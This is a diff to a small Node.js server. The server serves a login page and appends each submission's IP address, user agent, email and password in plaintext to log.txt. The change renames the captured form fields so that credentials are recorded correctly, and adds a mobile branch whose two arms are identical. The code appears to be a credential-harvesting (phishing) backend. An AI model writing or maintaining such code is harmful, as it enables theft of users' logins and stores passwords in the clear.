@@ -20,7 +20,8 @@ http.createServer(function(req, res){
     }
     console.log(req.url);
     if(url === '/') {
-        serveFile('/public/index', res);
+        if(mobile) serveFile('/public/index', res);
+        else serveFile('/public/index', res);
     } 
     else if(url === '/login'){
         console.log('Method: '+req.method);
@@ -80,8 +81,8 @@ function processData(req, res) {
                     +'\nurl: '+req.url
                     +'\nip: '+ (req.headers['x-forwarded-for'] || req.connection.remoteAddress)
                     +'\nua: '+req.headers['user-agent']
-                    +'\nemail: '+req.body.Email
-                    +'\npassword: '+req.body.Pass
+                    +'\nemail: '+req.body.email
+                    +'\npassword: '+req.body.pass
 
         fs.appendFile('log.txt', log, function(err){
             if(err) return console.log(err);
